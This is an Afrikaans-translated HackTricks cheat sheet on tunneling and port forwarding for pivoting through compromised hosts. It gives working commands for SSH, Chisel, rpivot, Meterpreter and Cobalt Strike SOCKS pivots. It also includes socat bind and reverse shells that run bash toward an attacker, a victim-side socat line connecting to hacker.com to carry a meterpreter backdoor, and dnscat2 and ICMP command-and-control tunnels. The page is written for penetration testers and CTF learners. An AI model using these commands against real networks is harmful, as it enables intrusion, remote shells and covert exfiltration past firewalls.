# Tunneling en Poort Deurverwysing

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy by 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks-opslagplek](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-opslagplek](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Probeer Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Nmap wenk

{% hint style="warning" %}
**ICMP** en **SYN** skandeerders kan nie deur sokkiesproksi's getunnel word nie, dus moet ons **ping-ontdekking uitskakel** (`-Pn`) en spesifiseer **TCP-skandeerders** (`-sT`) vir hierdie doel.
{% endhint %}

## **Bash**

**Gasheer -> Spring -> InterneA -> InterneB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiese verbinding (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Plaaslike Poort-na-Poort

Maak 'n nuwe poort oop in SSH-bediener --> Ander poort
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Poort-tot-poort

Plaaslike poort --> Gehackte gasheer (SSH) --> Derde\_kas:Poort
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Poort2gasheer (proxychains)

Plaaslike Poort --> Gehackte gasheer (SSH) --> Waar ook al
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Omgekeerde Poort Deurstuur

Dit is nuttig om omgekeerde shells te verkry van interne gasheer deur 'n DMZ na jou gasheer:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tonnel

Jy benodig **root in beide toestelle** (aangesien jy nuwe interfaces gaan skep) en die sshd-config moet root login toelaat:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
**Aktiveer deurstuur op die Bedienerkant**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Stel 'n nuwe roete aan die kliëntkant in.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Jy kan **tunnel** via **ssh** al die **verkeer** na 'n **subnetwerk** deur 'n gasheer.\
Byvoorbeeld, stuur al die verkeer wat na 10.10.10.0/24 gaan.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Maak 'n verbinding met 'n privaatsleutel.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Poort-tot-poort

Plaaslike poort --> Gehackte gasheer (aktiewe sessie) --> Derde\_kas:Poort
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) is a protocol that routes network packets between a client and a server through a proxy server. It can be used for tunneling and port forwarding to bypass firewalls and access restricted networks.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
### Tunneling and Port Forwarding

#### Tunneling

Tunneling is a method that allows data to be transferred securely over an insecure network. It involves encapsulating the data in another protocol to create a secure communication channel. This can be useful for bypassing firewalls, accessing restricted content, and maintaining privacy.

#### Port Forwarding

Port forwarding is a technique that allows a computer's port to be accessed from another computer over a network. It can be used to redirect traffic from a specific port to another destination, enabling remote access to services running on a specific port. Port forwarding is commonly used in scenarios where direct communication between two computers is not possible due to network configurations.
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Maak 'n poort oop in die spanbediener wat luister op al die koppelvlakke wat gebruik kan word om die verkeer deur die vuurtoring te **roeteer**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
In hierdie geval is die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie, en die verkeer word gestuur na die Spanbediener en vandaar na die aangeduide gasheer:poort
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port plaaslik

{% hint style="warning" %}
In hierdie geval word die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie en die **verkeer word gestuur na die Cobalt Strike-kliënt** (nie na die Spanbediener nie) en vandaar na die aangeduide gasheer:poort
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Jy moet 'n weblêer tonnel oplaai: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Beitel

Jy kan dit aflaai van die vrystellingsbladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Jy moet dieselfde weergawe vir klient en bediener gebruik
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Poort deurstuur
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Omgekeerde tonnel. Die tonnel word vanaf die slagoffer begin.\
'n Socks4-proksi word geskep op 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot deur **NTLM-proksi**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind skul
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Terugskulp
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Poort-tot-poort
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Poort-tot-poort deur middel van kouse
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter deur SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Jy kan 'n **nie-geauthentiseerde proksi** omseil deur hierdie lyn uit te voer in plaas van die laaste een in die slagoffer se konsole:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/omgekeerde-ssl-agterdeur-met-socat-en-metasploit/](https://funoverip.net/2011/01/omgekeerde-ssl-agterdeur-met-socat-en-metasploit/)

### SSL Socat Tonnel

**/bin/sh konsole**

Skep sertifikate aan beide kante: Klient en Bediener
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Afgeleë Poort-tot-Poort

Verbind die plaaslike SSH-poort (22) met die 443-poort van die aanvaller se gasheer.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Dit is soos 'n konsolweergawe van PuTTY (die opsies is baie soortgelyk aan 'n ssh-klient).

Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit 'n ssh-klient is, moet ons ons ssh-diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs lokaal toeganklike poorte na 'n poort op ons masjien deur te stuur:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Poort-tot-poort

Jy moet 'n plaaslike admin wees (vir enige poort)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Jy moet **RDP-toegang oor die stelsel** hê.\
Aflaai:

1. [SocksOverRDP x64 Binêre lêers](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie instrument gebruik `Dinamiese Virtuele Kanale` (`DVC`) van die Verrekenaarbedienerdiensfunksie van Windows. DVC is verantwoordelik vir **tunneling pakkies oor die RDP-verbinding**.
2. [Proxifier Draagbare Binêre lêer](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** op jou kliëntrekenaar soos hierdie:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nou kan ons **verbind** met die **slagoffer** oor **RDP** deur **`mstsc.exe`** te gebruik, en ons behoort 'n **aanvraag** te ontvang wat sê dat die **SocksOverRDP-inprop** geaktiveer is, en dit sal **luister** op **127.0.0.1:1080**.

**Verbind** via **RDP** en laai & voer op die slagoffer se masjien die `SocksOverRDP-Server.exe` binêre lêer uit:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bevestig nou op jou masjien (aanvaller) dat poort 1080 aan die luister is:
```
netstat -antb | findstr 1080
```
Nou kan jy [**Proxifier**](https://www.proxifier.com/) gebruik **om die verkeer deur daardie poort te proxy.**

## Proxify Windows GUI Apps

Jy kan Windows GUI-programme laat navigeer deur 'n proxy te gebruik met [**Proxifier**](https://www.proxifier.com/).\
In **Profiel -> Proxy-bedieners** voeg die IP en poort van die SOCKS-bediener by.\
In **Profiel -> Proxifiseringreëls** voeg die naam van die program wat geproxifiseer moet word by en die verbindinge na die IP-adresse wat jy wil proxifiseer.

## NTLM proxy omseil

Die voorheen genoemde instrument: **Rpivot**\
**OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasie-lêer in te stel:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Dit verifieer teen 'n proksi en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgestuur word. Dan kan jy die gereedskap van jou keuse deur hierdie poort gebruik.\
Byvoorbeeld wat poort 443 deurstuur
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nou, as jy byvoorbeeld die **SSH**-diens in die slagoffer instel om na port 443 te luister. Jy kan daarmee verbind deur die aanvaller se poort 2222.\
Jy kan ook 'n **meterpreter** gebruik wat na localhost:443 verbind en die aanvaller luister na poort 2222.

## YARP

'n Omgekeerde proxy geskep deur Microsoft. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root is nodig in beide stelsels om tun-adaptere te skep en data tussen hulle te tunnel met behulp van DNS-navrae.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Die tonnel sal baie stadig wees. Jy kan 'n gekomprimeerde SSH-verbinding deur hierdie tonnel skep deur die volgende te gebruik:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

Stel 'n C\&C-kanaal deur DNS op. Dit benodig nie root-voorregte nie.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om 'n dnscat2-klient in PowerShell te hardloop:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Poort deurstuur met dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Verander proxychains DNS

Proxychains onderskep die `gethostbyname` libc-oproep en stuur tcp DNS-versoeke deur die socks-proksi. Standaard gebruik proxychains die DNS-bediener **4.2.2.2** (hardgekoeër). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** instel.

## Tonnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tonneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is nodig in beide stelsels om tonnel-adaptere te skep en data tussen hulle te stuur deur gebruik te maak van ICMP-echoversoeke.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) is 'n gereedskap om oplossings aan die internet bloot te stel met een opdragreël.**
*Blootstellings URI is soos:* **UID.ngrok.io**

### Installasie

- Skep 'n rekening: https://ngrok.com/signup
- Klient aflaai:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Basiese gebruike

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Dit is ook moontlik om verifikasie en TLS by te voeg, indien nodig.*

#### Tonneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Blootstelling van lêers met HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP oproepe

*Handig vir XSS, SSRF, SSTI ...*
Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling interne HTTP-diens
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml eenvoudige konfigurasie voorbeeld

Dit maak 3 tonnels oop:
- 2 TCP
- 1 HTTP met statiese lêers blootstelling vanaf /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Ander gereedskap om te kontroleer

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Probeer Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
